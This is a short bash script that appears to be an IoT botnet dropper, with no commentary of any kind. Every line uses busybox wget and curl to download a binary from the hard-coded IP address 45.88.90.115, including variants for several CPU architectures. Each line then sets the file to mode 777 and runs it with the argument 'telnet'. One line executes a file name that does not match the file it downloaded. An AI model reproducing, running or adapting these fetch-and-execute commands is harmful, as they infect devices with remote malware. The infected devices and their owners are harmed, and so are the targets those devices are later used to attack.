#!/bin/bash
busybox wget http://45.88.90.115/x8.n; curl -O http://45.88.90.115/x8.n;chmod 777 x8.n;./x8.n telnet
busybox wget http://45.88.90.115/x6.n; curl -O http://45.88.90.115/x6.n;chmod 777 x6.n;./x6.n telnet
busybox wget http://45.88.90.115/sp.n; curl -O http://45.88.90.115/sp.n;chmod 777 sp.n;./sp.n telnet
busybox wget http://45.88.90.115/sh.n; curl -O http://45.88.90.115/sh.n;chmod 777 sh.n;./m.nn telnet
busybox wget http://45.88.90.115/pp.n; curl -O http://45.88.90.115/pp.n;chmod 777 pp.n;./pp.n telnet
busybox wget http://45.88.90.115/mp.n; curl -O http://45.88.90.115/mp.n;chmod 777 mp.n;./mp.n telnet
busybox wget http://45.88.90.115/mip.n; curl -O http://45.88.90.115/mip.n;chmod 777 mip.n;./mip.n telnet
busybox wget http://45.88.90.115/m6.n; curl -O http://45.88.90.115/m6.n;chmod 777 m6.n;./m6.n telnet
busybox wget http://45.88.90.115/a7.n; curl -O http://45.88.90.115/a7.n;chmod 777 a7.n;./a7.n telnet
busybox wget http://45.88.90.115/a6.n; curl -O http://45.88.90.115/a6.n;chmod 777 a6.n;./a6.n telnet
busybox wget http://45.88.90.115/a5.n; curl -O http://45.88.90.115/a5.n;chmod 777 a5.n;./a5.n telnet
busybox wget http://45.88.90.115/a.n; curl -O http://45.88.90.115/a.n;chmod 777 a.n;./a.n telnet